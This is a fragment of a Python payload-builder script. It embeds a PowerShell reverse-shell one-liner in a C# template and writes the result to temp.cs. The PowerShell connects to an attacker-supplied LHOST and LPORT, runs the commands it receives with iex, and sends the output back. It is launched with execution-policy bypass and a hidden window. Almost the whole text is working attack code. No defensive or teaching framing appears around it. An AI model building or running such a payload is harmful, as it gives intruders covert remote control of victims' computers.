...
script = "Start-Process $PSHOME\\\\powershell.exe -ArgumentList {-ep bypass -nop $client = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + '<--deeexcee--> ' + (pwd).Path + '#~ ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -WindowStyle Hidden"
    ...
    {{
		...
		WindowStyle = ProcessWindowStyle.Hidden,
           ...
           process.Start();
            ...
            process.StandardInput.WriteLine(hsghjghdjf);
...
"""
# Add PS Script to Code
c_sharpCodeUpdate = c_sharpCode.format(script)

with open("temp.cs", "w") as out_file:
       out_file.write(c_sharpCodeUpdate)
